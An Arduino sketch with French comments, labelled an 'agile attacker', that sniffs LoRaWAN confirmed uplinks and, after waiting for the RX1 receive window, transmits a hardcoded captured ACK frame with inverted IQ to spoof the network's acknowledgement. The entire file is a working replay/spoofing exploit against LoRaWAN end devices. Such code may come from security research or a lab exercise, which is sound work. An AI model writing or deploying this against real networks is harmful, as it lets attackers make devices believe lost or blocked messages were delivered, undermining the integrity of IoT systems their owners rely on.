#include <SPI.h>
#include <LoRa.h>

byte capturedACK[] = {0x60, 0x62, 0x7B, 0x0C, 0x01, 0xAD, 0x0E, 0x00, 0x19, 0x92, 0xB5, 0xE8};
long currentFrequency = 868100000; // Fréquence de départ

void setup() {
  Serial.begin(115200);
  // On commence par la fréquence de votre log
  if (!LoRa.begin(currentFrequency)) { 
    while (1);
  }
  LoRa.setSpreadingFactor(7);
  LoRa.setSyncWord(0x34); 
  Serial.println("=== ATTAQUANT AGILE PRÊT ===");
}

void loop() {
  // L'attaquant scanne les fréquences ou reste sur la dernière connue
  int packetSize = LoRa.parsePacket();
  
  if (packetSize) {
    // RECUPERER LA FREQUENCE ACTUELLE DU PAQUET REÇU
    // Note: Certains shields LoRa permettent de lire la fréquence porteuse
    Serial.print("Uplink détecté sur la fréquence actuelle !");
    
    byte mhdr = LoRa.read();
    if (mhdr == 0x80) { // Confirmed Up
      Serial.println(" -> Message CONFIRMED. Lancement Spoofing...");

      // On attend la fenêtre RX1
      delay(970); 

      // On s'assure d'envoyer sur la fréquence exacte où on a reçu l'Uplink
      LoRa.enableInvertIQ(); 
      LoRa.beginPacket();
      LoRa.write(capturedACK, sizeof(capturedACK));
      LoRa.endPacket();
      LoRa.disableInvertIQ();

      Serial.println(" Faux ACK injecté.");
    }
  }
}
